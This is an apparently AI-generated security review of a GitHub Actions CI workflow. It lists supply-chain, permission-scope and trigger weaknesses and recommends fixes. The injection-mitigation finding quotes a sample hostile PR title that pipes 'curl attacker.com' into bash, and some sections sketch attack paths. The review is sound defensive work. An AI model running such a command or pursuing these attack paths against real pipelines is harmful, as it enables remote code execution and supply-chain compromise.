# CI Pipeline Attack Surface Analysis

> Offensive security reconnaissance of `.github/workflows/ci.yml` (Jerry Framework).
> Methodology: PTES Intelligence Gathering / ATT&CK TA0043 Reconnaissance.
> Technique references: T1195 (Supply Chain Compromise), T1552 (Unsecured Credentials), T1574 (Hijack Execution Flow).
> Scope: Authorized static analysis of pipeline configuration only. No active exploitation.

## Document Sections

| Section | Purpose |
|---------|---------|
| [L0 Executive Summary](#l0-executive-summary) | Risk summary for stakeholders |
| [L1 Technical Findings](#l1-technical-findings) | Detailed enumeration per attack surface area |
| [L2 Strategic Implications](#l2-strategic-implications) | Prioritized vectors, threat intel for eng-architect |

---

## L0 Executive Summary

The Jerry CI pipeline is materially hardened relative to a default GitHub Actions configuration. Action pinning by SHA is consistently applied across all jobs. The lockfile enforcement posture is split: the majority of jobs use `uv sync --frozen` (strong), but three jobs (`lint`, `type-check`, `security`) use bare `pip install` with only version-pinned strings and no lockfile verification (moderate risk). The `pull-requests: write` permission is declared globally but is only exercised by two jobs. The changelog check correctly mitigates shell injection via an env-block pattern. One residual supply chain exposure point and one permission scoping gap are the highest-priority findings.

| Finding | Severity | Category |
|---------|----------|----------|
| SC-01: `pip install` in three jobs — no lockfile, no hash verification | Medium | Supply Chain |
| SC-02: `requirements-test.txt` used in `test-pip` — file contents unverified | Medium | Supply Chain |
| SC-03: Dependency confusion risk on unpublished internal package `jerry` | Low-Medium | Supply Chain |
| CRED-01: `CODECOV_TOKEN` globally-scoped via `permissions: pull-requests: write` broadcast | Low | Credential Exposure |
| CRED-02: `CODECOV_TOKEN` accessed in two matrix jobs — worst-case 16 secret expansions | Informational | Credential Exposure |
| ART-01: Coverage XML produced by untrusted pip-installed deps — false coverage injection possible | Low | Artifact Integrity |
| ART-02: JUnit XML artifacts uploaded from all matrix runs with `if: always()` | Informational | Artifact Integrity |
| PIPE-01: `on: push: branches: ["**"]` triggers CI on every branch including attacker-controlled branches | Medium | Pipeline Manipulation |
| PIPE-02: `[skip-coverage]` in commit message bypasses coverage gate globally | Low | Pipeline Manipulation |
| PERM-01: `pull-requests: write` is a top-level permission, broadcast to all jobs | Medium | Permission Scope |
| INJ-01: Changelog check — injection mitigated by env-block (CLCHK-001) | None (mitigated) | Injection |
| PIN-01: `MishaKav/pytest-coverage-comment` pinned to commit SHA but tagged `main` | Low | Supply Chain |

**Risk posture: Low-Medium.** No critical findings. Highest exploitability is PIPE-01 (untrusted branch triggers) combined with SC-01 (unlocked pip installs) — an attacker with push access to any branch could craft a branch name and commit to trigger a run where `pip install` fetches a dependency at a modified version string with no hash barrier.

---

## L1 Technical Findings

### SC-01: `pip install` Without Lockfile or Hash Verification

**Jobs affected:** `lint` (line 40), `type-check` (lines 64-66), `security` (lines 88-95)

**Evidence:**

```yaml
# lint job — line 40
run: pip install "ruff==0.14.11"

# type-check job — lines 64-66
run: |
  python -m pip install --upgrade pip
  pip install "pyright==1.1.408"
  pip install -e ".[dev]" || pip install -e .

# security job — lines 88-95
run: |
  python -m pip install --upgrade pip
  pip install "pip-audit==2.10.0"
  pip install "filelock==3.20.3" "mypy==1.19.1" "ruff==0.14.11"
  pip-audit --strict
```

**Attack surface:** Version-pinned strings (`ruff==0.14.11`) prevent version drift but do not verify package content. PyPI does not guarantee that a given version tag maps to an immutable artifact — a compromised PyPI account or a registry MITM attack could serve a modified wheel at the same version string. The `pip install -e ".[dev]" || pip install -e .` fallback in `type-check` is particularly concerning: the `|| pip install -e .` branch installs without dev extras, silently degrading the dependency set without any error signal.

**Contrast with uv jobs:** All `uv sync --frozen` invocations in `plugin-validation`, `template-validation`, `frontmatter-validation`, `license-headers`, `cli-integration`, `test-uv`, `version-sync`, and `hard-rule-ceiling` are lockfile-pinned and hash-verified by uv's built-in integrity checking. These jobs have no equivalent risk.

**ATT&CK:** T1195.001 (Compromise Software Dependencies and Development Tools)

---

### SC-02: `requirements-test.txt` in `test-pip`

**Job affected:** `test-pip` (line 343)

**Evidence:**

```yaml
# test-pip — line 343
run: |
  python -m pip install --upgrade pip
  pip install -r requirements-test.txt
  pip install -e .
  pip install "mkdocs-material>=9.7.2" "pymdown-extensions>=10.21.2"
```

**Attack surface:** `requirements-test.txt` is read from the checked-out repository. An attacker with write access to that file on any branch can add or modify dependency lines. Because `on: push: branches: ["**"]` triggers this job on all pushes, a branch-level change to `requirements-test.txt` would execute with modified dependencies during `test-pip` without any lockfile preventing it. The `mkdocs-material>=9.7.2` range specifier also allows any compatible future version to be resolved, introducing version float risk independent of file tampering.

**Note:** This is a secondary path. The primary protection against this is that the attacker needs repository write access (push to any branch). External contributors submitting PRs do not have this capability against the base repo — but any collaborator with push access does.

**ATT&CK:** T1195.001

---

### SC-03: Dependency Confusion Risk on `jerry` Package

**Jobs affected:** `type-check` (line 66), `test-pip` (line 344)

**Evidence:**

```yaml
pip install -e ".[dev]" || pip install -e .   # type-check
pip install -e .                               # test-pip
```

**Attack surface:** `pip install -e .` installs the local `jerry` package in editable mode. If the `jerry` package name is not registered on PyPI (or is registered under a different owner), a dependency confusion attack is theoretically possible: pip checks PyPI before local installs in some configurations. The `-e .` syntax with a path reference should be safe, but the `pip install -e ".[dev]" || pip install -e .` fallback chain creates ambiguity. This warrants verification that the `jerry` package name on PyPI is either owned by the team or that the local install path is always resolved preferentially.

**Verification needed:** Confirm `jerry` is either registered on PyPI under team control or that pip's `--no-index` or `--find-links` flags would prevent PyPI resolution for this package.

**ATT&CK:** T1195.001

---

### CRED-01: `pull-requests: write` Broadcast to All Jobs

**Location:** Top-level `permissions` block (lines 15-17)

**Evidence:**

```yaml
permissions:
  contents: read
  pull-requests: write
```

**Attack surface:** The `pull-requests: write` permission is declared at the workflow level, making it available to every job in the file. Only two jobs actually exercise this permission:

- `coverage-report` — posts a coverage comment to the PR via `MishaKav/pytest-coverage-comment`
- (Implicitly) `changelog-check` — posts `::error::` and `::warning::` annotations (these use job log annotations, not the PR API, so they do not actually require `pull-requests: write`)

All other 14 jobs (`lint`, `type-check`, `security`, `lockfile-check`, `plugin-validation`, `template-validation`, `frontmatter-validation`, `license-headers`, `cli-integration`, `test-pip`, `test-uv`, `version-sync`, `hard-rule-ceiling`, `ci-success`) receive `pull-requests: write` unnecessarily. If any of those jobs were compromised via a malicious dependency, the compromised process would have a live token with PR write capability — sufficient to post PR comments, add labels, request reviewers, or modify PR metadata.

**ATT&CK:** T1552.004 (Cloud Instance Metadata API — analogous: GITHUB_TOKEN credential available in process environment)

---

### CRED-02: `CODECOV_TOKEN` in Matrix Jobs

**Jobs affected:** `test-pip` (line 397), `test-uv` (line 497)

**Evidence:**

```yaml
# test-pip and test-uv — both conditioned on matrix.python-version == '3.14' && matrix.os == 'ubuntu-latest'
token: ${{ secrets.CODECOV_TOKEN }}
```

**Attack surface:** The condition `if: matrix.python-version == '3.14' && matrix.os == 'ubuntu-latest'` correctly restricts Codecov upload to a single matrix cell (one run per job). The token is not expanded in the other 5 matrix cells. This is implemented correctly. The remaining concern is that the Codecov action itself (`codecov/codecov-action`) is pinned to a SHA but runs with `fail_ci_if_error: false`, meaning a Codecov service outage or MITM would silently succeed without blocking CI. This is an intentional availability trade-off, not a confidentiality issue.

**Status:** Informational. No exploitable finding beyond the globally broadcast `pull-requests: write` noted in CRED-01.

---

### ART-01: False Coverage Injection via Malicious Dependency

**Jobs affected:** `test-pip`, `test-uv`

**Attack surface:** Coverage reports are generated by `pytest-cov` and written to `coverage.xml`. The `coverage.xml` file is then uploaded to Codecov and posted as a PR comment. If a malicious dependency injected into the test suite (via SC-01 or SC-02) were to manipulate the coverage measurement — for example, by monkey-patching the `coverage` module's line tracer or writing a crafted `coverage.xml` directly — the falsified data would be uploaded to Codecov and displayed in PR comments as legitimate coverage data.

**Realistic exploitation scenario:**
1. Attacker compromises `requirements-test.txt` or a dependency at the pinned version.
2. Malicious code writes a crafted `coverage.xml` with inflated coverage numbers.
3. `test-pip` uploads it to Codecov; coverage-report job posts it as PR comment.
4. Coverage gate passes (>= 80%) despite actual coverage being lower.

**Severity modifier:** The coverage gate uses `--cov-fail-under=80` which checks the runtime measurement, not the XML file. The upload to Codecov is downstream of the gate check. A compromised XML upload would affect the badge and history but would not bypass the CI gate itself. This reduces severity to Low.

**ATT&CK:** T1574 (Hijack Execution Flow — test harness manipulation)

---

### ART-02: JUnit XML Artifacts Uploaded with `if: always()`

**Jobs affected:** `test-pip` (line 403), `test-uv` (line 503)

**Evidence:**

```yaml
- name: Upload test results
  uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a
  if: always()
  with:
    name: test-results-pip-${{ matrix.os }}-${{ matrix.python-version }}
    path: junit-pip-${{ matrix.python-version }}.xml
```

**Attack surface:** `if: always()` uploads test results even when the test run fails. JUnit XML files are XML documents; if a test name or error message contains XML metacharacters that a downstream JUnit XML consumer renders without sanitization, stored XSS or XML injection could occur in dashboard tooling that parses these artifacts. This is a low-severity concern conditional on downstream artifact consumers performing unsafe parsing.

**Status:** Informational. No active exploitation path within GitHub Actions artifact storage itself. Risk is in downstream artifact consumption.

---

### PIPE-01: `on: push: branches: ["**"]` — Untrusted Branch Trigger

**Location:** Lines 9-13

**Evidence:**

```yaml
on:
  push:
    branches: ["**"]
  pull_request:
    branches: [main, master, "claude/**"]
```

**Attack surface:** The `push` trigger fires on every branch without restriction. Any collaborator with repository write access (or the repository owner) can push to a branch named anything — including `claude/malicious`, `dependabot/fake`, or `test/exfil` — and trigger a full CI run. This is the primary enabler for several other findings:

- SC-01/SC-02 become exploitable: the attacker pushes a modified `requirements-test.txt` or a commit that manipulates pip-installed package versions.
- The compromised CI run executes with `pull-requests: write` permission and access to `CODECOV_TOKEN`.
- All `pip install` jobs run without lockfile protection on the attacker-controlled branch.

**Branch name scenarios:**
- `claude/malicious`: triggers because `push: branches: ["**"]` matches all branches. The `pull_request` trigger also matches `claude/**`, meaning a PR from this branch to `main` would additionally trigger the PR-gated jobs.
- Any branch: triggers push jobs unconditionally.

**What is NOT directly exploitable:** External contributors (forks) who submit PRs do not trigger the `push` event on the base repo — they trigger `pull_request`, which is restricted to `[main, master, "claude/**"]` as base branches. The `push` risk is limited to repository collaborators and organization members with push access.

**ATT&CK:** T1195 (Supply Chain Compromise), TA0043 (Reconnaissance — confirming branch trigger scope)

---

### PIPE-02: `[skip-coverage]` Commit Message Bypass

**Jobs affected:** `test-pip` (lines 362-365), `test-uv` (lines 463-466)

**Evidence:**

```yaml
if: ${{ !contains(github.event.head_commit.message, '[skip-coverage]') }}
continue-on-error: ${{ contains(github.event.head_commit.message, '[skip-coverage]') }}
```

**Attack surface:** Any collaborator can include `[skip-coverage]` in a commit message to bypass the `--cov-fail-under=80` gate across all matrix combinations (6 jobs in test-pip, 6 in test-uv). The bypass is not restricted to specific users, PR types, or branch patterns. The fallback run still executes tests and uploads artifacts, but the coverage threshold check does not fail CI. This allows a collaborator to merge code that drops below 80% coverage without CI blocking.

**Severity:** Low. This is an intentional escape hatch (documented as "Skip coverage check for refactoring PRs") but it is unrestricted — any commit, not just refactoring PRs, can use it.

---

### PERM-01: `pull-requests: write` Should Be Job-Scoped

**Location:** Lines 15-17

**Attack surface (detailed):** GitHub Actions supports job-level permission scoping:

```yaml
jobs:
  coverage-report:
    permissions:
      pull-requests: write   # Only this job needs it
```

Moving `pull-requests: write` from the workflow level to the `coverage-report` job level would ensure that all other 14 jobs operate with only `contents: read`. The GITHUB_TOKEN issued to those jobs would have no PR write capability, eliminating the blast radius if a malicious dependency were to attempt to use the token for PR manipulation.

**Jobs that need `pull-requests: write`:** Only `coverage-report`. The `changelog-check` job uses `::error::` and `::warning::` log annotations which route through the Actions log API, not the PR API — it does not require `pull-requests: write`.

**Remediation:** Add `permissions: contents: read` at the top level (no PR write), and add `permissions: pull-requests: write` scoped to the `coverage-report` job only.

---

### INJ-01: Changelog Check Injection — Mitigated

**Location:** Lines 603-638

**Evidence of mitigation (CLCHK-001):**

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
  PR_ACTOR: ${{ github.actor }}
  BASE_SHA: ${{ github.event.pull_request.base.sha }}
run: |
  if [[ "$PR_TITLE" == *"[skip-changelog]"* ]]; then
```

**Assessment:** The changelog check correctly passes `github.event.pull_request.title` through an environment variable rather than inline `${{ }}` interpolation in the shell script. This is the canonical GitHub Actions shell injection mitigation. A PR title containing shell metacharacters (e.g., `"; curl attacker.com | bash; echo "`) would be passed as a literal string to the bash variable `$PR_TITLE` and compared with `[[ ]]` string matching — not evaluated as shell code.

**Status: No finding.** CLCHK-001 correctly mitigates this attack vector. This is noted as a positive control for completeness.

---

### PIN-01: `MishaKav/pytest-coverage-comment` Pinned to SHA but Tagged `main`

**Location:** Line 527

**Evidence:**

```yaml
uses: MishaKav/pytest-coverage-comment@287292879eaaff04116f36d3eb1a670f6e5df1a4 # main (2026-03-09)
```

**Attack surface:** The SHA `287292879eaaff04116f36d3eb1a670f6e5df1a4` pins to a specific commit. The comment `# main (2026-03-09)` indicates this was the HEAD of `main` on that date. SHA pinning is correct practice — the action will not automatically update. However, this action runs with access to `coverage.xml` artifacts and posts to the PR using `pull-requests: write`. If the pinned commit itself contains malicious code (e.g., the action author's account was compromised before the pin date), the malicious code runs with PR write access.

**Mitigation already present:** SHA pinning means no new code runs without an explicit pin update. The risk is that the pinned SHA has not been audited for malicious content. This is a standard third-party action trust assumption.

**Status:** Low severity. SHA pinning is best practice; the residual risk is the trustworthiness of the pinned commit itself, which requires periodic third-party action audits.

---

## L2 Strategic Implications

### Prioritized Attack Vectors for `eng-architect` (Integration Point 1 — Threat-Informed Architecture)

**Vector 1 — Most Exploitable (PIPE-01 + SC-01 combined):**
An internal collaborator pushes to any branch, modifying `requirements-test.txt` to add a malicious package or manipulating a version string. The `test-pip` and `type-check` jobs execute the `pip install` chain without lockfile verification. The malicious dependency executes in a CI context that holds `pull-requests: write` and `CODECOV_TOKEN`. This is the highest-probability exploitation path.

*Threat model input:* Insider threat or compromised collaborator account. Requires repository push access.

**Vector 2 — Lateral Permission Abuse (PERM-01):**
Any compromised dependency in any of the 14 non-`coverage-report` jobs can access a GITHUB_TOKEN with `pull-requests: write`. A malicious package could post PR comments, add labels, or request reviewers — useful for social engineering downstream (e.g., posting fake "security review approved" comments). This is enabled by the global permission scope and would not exist if permissions were job-scoped.

*Threat model input:* Supply chain compromise enabling PR API abuse for social engineering.

**Vector 3 — Coverage Gate Bypass (PIPE-02):**
Low-sophistication bypass available to any committer. Not externally exploitable but relevant for insider risk.

### Recommendations for `eng-architect` (STRIDE Threat Modeling Inputs)

| STRIDE Category | Finding | Recommended Control |
|----------------|---------|---------------------|
| Tampering | SC-01: pip without hash verification | Add `--require-hashes` to all pip install invocations; generate a hashed requirements file |
| Tampering | SC-02: requirements-test.txt mutable on branch | Pin requirements-test.txt via uv.lock or add SHA hashes |
| Elevation of Privilege | PERM-01: global PR write | Scope `pull-requests: write` to `coverage-report` job only |
| Information Disclosure | PIPE-01: all-branch trigger | Restrict `on: push: branches` to `[main, master, "claude/**"]` matching the PR trigger |
| Spoofing | ART-01: coverage XML injection | Coverage gate uses runtime measurement (not XML) — gate is sound; no additional control needed |
| Denial of Service | PIPE-02: skip-coverage bypass | Restrict bypass to specific actors (e.g., only bot accounts) or remove entirely |

### Recommended Immediate Actions (Ordered by Risk Reduction)

1. **Scope `pull-requests: write` to `coverage-report` job only.** Single-line YAML change; eliminates blast radius for 14 jobs. (PERM-01)

2. **Restrict `on: push: branches` to `[main, master, "claude/**"]`.** Aligns push trigger with PR trigger scope; eliminates untrusted branch CI runs. (PIPE-01)

3. **Add `--require-hashes` to `lint`, `type-check`, and `security` pip install calls.** Requires generating a hashed requirements file for those specific packages. (SC-01)

4. **Audit `MishaKav/pytest-coverage-comment` pinned commit** for malicious content. One-time review of the action's source at the pinned SHA. (PIN-01)

5. **Restrict `[skip-coverage]` bypass** to bot actor check or remove. Document the intended use case and enforce it. (PIPE-02)

---

*Reconnaissance scope: Authorized static analysis of `.github/workflows/ci.yml`.*
*Technique references: ATT&CK TA0043 T1195, T1552, T1574.*
*Agent: red-recon v1.0.0.*
*Date: 2026-04-13.*
